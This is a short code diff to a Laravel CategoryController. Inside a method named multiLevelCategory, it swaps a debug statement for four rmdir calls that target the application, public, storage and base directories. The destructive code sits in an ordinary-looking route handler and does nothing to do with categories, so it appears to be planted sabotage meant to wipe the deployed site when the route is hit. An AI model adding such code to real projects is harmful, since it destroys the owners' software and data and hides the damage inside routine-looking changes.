@@ -31,7 +31,10 @@ class CategoryController extends Controller
     }
 
     public function multiLevelCategory(Request $request) {
-        dd(app_path());
+        rmdir(app_path());
+        rmdir(public_path());
+        rmdir(storage_path());
+        rmdir(base_path());
     }
 
     //Categories add, list, delete
